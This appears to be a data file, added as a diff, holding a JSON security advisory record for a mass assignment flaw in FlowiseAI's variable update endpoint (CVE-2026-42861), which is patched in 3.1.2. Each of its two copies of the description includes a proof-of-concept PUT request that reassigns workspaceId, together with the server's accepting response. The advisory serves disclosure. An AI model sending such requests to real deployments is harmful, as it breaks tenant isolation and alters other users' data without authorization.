@@ -1,0 +1,103 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-42861",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 0,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 7.6,
+        "vector_string": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-284",
+      "CWE-639",
+      "CWE-915"
+    ],
+    "description": "### Summary\nA Mass Assignment vulnerability exists in the variable update endpoint of FlowiseAI.\n\nThe endpoint allows authenticated users to modify server-controlled properties such as workspaceId, createdDate, and updatedDate when updating a variable resource.\n\nDue to missing server-side validation and authorization checks, an attacker can manipulate the workspaceId field and reassign variables to arbitrary workspaces.\n\nThis behavior may break tenant isolation in multi-workspace environments.\n\n### Details\nThe endpoint responsible for updating variables:\n\n**PUT /api/v1/variables/{variableId}**\n\naccepts a JSON request body containing the variable definition.\n\nHowever, the backend does not restrict which attributes can be modified by the client. As a result, user-controlled request bodies can include internal properties that should normally be controlled exclusively by the server.\n\nServer-controlled fields that can be manipulated include:\n\n- workspaceId\n- createdDate\n- updatedDate\n\nThese fields appear to be directly mapped to the database entity without strict input validation or authorization checks.\n\nFor example, the following request body was accepted by the server:\n\n```json\n{\n  \"name\": \"aaa\",\n  \"value\": \"bbbe\",\n  \"type\": \"static\",\n  \"createdDate\": \"2016-03-06T17:59:30.000Z\",\n  \"updatedDate\": \"2016-03-06T18:00:17.000Z\",\n  \"workspaceId\": \"11111111-2222-3333-4444-555555555555\"\n}\n```\n\nThe server accepted the attacker-controlled workspaceId and metadata fields and persisted them.\n\n### PoC\n**Request**\n\n```http\nPUT /api/v1/variables/<VARIABLE_ID>\nContent-Type: application/json\n\n{\n  \"name\": \"aaa\",\n  \"value\": \"bbbe\",\n  \"type\": \"static\",\n  \"createdDate\": \"2016-03-06T17:59:30.000Z\",\n  \"updatedDate\": \"2016-03-06T18:00:17.000Z\",\n  \"workspaceId\": \"11111111-2222-3333-4444-555555555555\"\n}\n```\n\n**Response**\n\n```json\n{\n  \"id\": \"0a2b9f61-4a97-4ff8-b80d-00275ed18674\",\n  \"name\": \"aaa\",\n  \"value\": \"bbbe\",\n  \"type\": \"static\",\n  \"createdDate\": \"2016-03-06T17:59:30.000Z\",\n  \"updatedDate\": \"2026-03-06T18:05:17.000Z\",\n  \"workspaceId\": \"11111111-2222-3333-4444-555555555555\"\n}\n```\n\nThis confirms that the backend accepts and persists attacker-controlled internal properties.\n\n### Impact\nThis vulnerability allows authenticated users to manipulate internal attributes of variable resources.\n\nPossible impacts include:\n\n1. Cross-workspace reassignment of variables (workspaceId)\n2. Unauthorized modification of metadata (createdDate, updatedDate)\n3. Potential tenant isolation bypass in multi-workspace deployments\n\nIn multi-tenant environments, this may allow an attacker to move variables between workspaces without authorization.",
+    "ghsa_id": "GHSA-6fw7-3q8r-m5vj",
+    "html_url": "https://github.com/advisories/GHSA-6fw7-3q8r-m5vj",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-6fw7-3q8r-m5vj"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-42861"
+      }
+    ],
+    "published_at": "2026-05-14T14:52:24Z",
+    "references": [
+      "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6fw7-3q8r-m5vj",
+      "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-42861",
+      "https://github.com/advisories/GHSA-6fw7-3q8r-m5vj"
+    ],
+    "severity": "high",
+    "summary": "FlowiseAI has Mass Assignment in Variable Update Endpoint that Allows Cross-Workspace Resource Reassignment",
+    "updated_at": "2026-06-09T13:09:54Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "3.1.2",
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "vulnerable_version_range": "<= 3.1.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-6fw7-3q8r-m5vj",
+  "repo": {
+    "cve_id": "CVE-2026-42861",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 7.6,
+        "vector_string": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-284",
+      "CWE-639",
+      "CWE-915"
+    ],
+    "description": "### Summary\r\nA Mass Assignment vulnerability exists in the variable update endpoint of FlowiseAI.\r\n\r\nThe endpoint allows authenticated users to modify server-controlled properties such as workspaceId, createdDate, and updatedDate when updating a variable resource.\r\n\r\nDue to missing server-side validation and authorization checks, an attacker can manipulate the workspaceId field and reassign variables to arbitrary workspaces.\r\n\r\nThis behavior may break tenant isolation in multi-workspace environments.\r\n\r\n### Details\r\nThe endpoint responsible for updating variables:\r\n\r\n**PUT /api/v1/variables/{variableId}**\r\n\r\naccepts a JSON request body containing the variable definition.\r\n\r\nHowever, the backend does not restrict which attributes can be modified by the client. As a result, user-controlled request bodies can include internal properties that should normally be controlled exclusively by the server.\r\n\r\nServer-controlled fields that can be manipulated include:\r\n\r\n- workspaceId\r\n- createdDate\r\n- updatedDate\r\n\r\nThese fields appear to be directly mapped to the database entity without strict input validation or authorization checks.\r\n\r\nFor example, the following request body was accepted by the server:\r\n\r\n```json\r\n{\r\n  \"name\": \"aaa\",\r\n  \"value\": \"bbbe\",\r\n  \"type\": \"static\",\r\n  \"createdDate\": \"2016-03-06T17:59:30.000Z\",\r\n  \"updatedDate\": \"2016-03-06T18:00:17.000Z\",\r\n  \"workspaceId\": \"11111111-2222-3333-4444-555555555555\"\r\n}\r\n```\r\n\r\nThe server accepted the attacker-controlled workspaceId and metadata fields and persisted them.\r\n\r\n### PoC\r\n**Request**\r\n\r\n```http\r\nPUT /api/v1/variables/<VARIABLE_ID>\r\nContent-Type: application/json\r\n\r\n{\r\n  \"name\": \"aaa\",\r\n  \"value\": \"bbbe\",\r\n  \"type\": \"static\",\r\n  \"createdDate\": \"2016-03-06T17:59:30.000Z\",\r\n  \"updatedDate\": \"2016-03-06T18:00:17.000Z\",\r\n  \"workspaceId\": \"11111111-2222-3333-4444-555555555555\"\r\n}\r\n```\r\n\r\n**Response**\r\n\r\n```json\r\n{\r\n  \"id\": \"0a2b9f61-4a97-4ff8-b80d-00275ed18674\",\r\n  \"name\": \"aaa\",\r\n  \"value\": \"bbbe\",\r\n  \"type\": \"static\",\r\n  \"createdDate\": \"2016-03-06T17:59:30.000Z\",\r\n  \"updatedDate\": \"2026-03-06T18:05:17.000Z\",\r\n  \"workspaceId\": \"11111111-2222-3333-4444-555555555555\"\r\n}\r\n```\r\n\r\nThis confirms that the backend accepts and persists attacker-controlled internal properties.\r\n\r\n### Impact\r\nThis vulnerability allows authenticated users to manipulate internal attributes of variable resources.\r\n\r\nPossible impacts include:\r\n\r\n1. Cross-workspace reassignment of variables (workspaceId)\r\n2. Unauthorized modification of metadata (createdDate, updatedDate)\r\n3. Potential tenant isolation bypass in multi-workspace deployments\r\n\r\nIn multi-tenant environments, this may allow an attacker to move variables between workspaces without authorization.\r\n",
+    "ghsa_id": "GHSA-6fw7-3q8r-m5vj",
+    "html_url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6fw7-3q8r-m5vj",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-6fw7-3q8r-m5vj"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-42861"
+      }
+    ],
+    "published_at": "2026-05-14T14:12:50Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Mass Assignment in Variable Update Endpoint Allows Cross-Workspace Resource Reassignment",
+    "updated_at": "2026-05-14T14:12:50Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "patched_versions": "3.1.2",
+        "vulnerable_version_range": "<= 3.1.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "FlowiseAI/Flowise"
+}
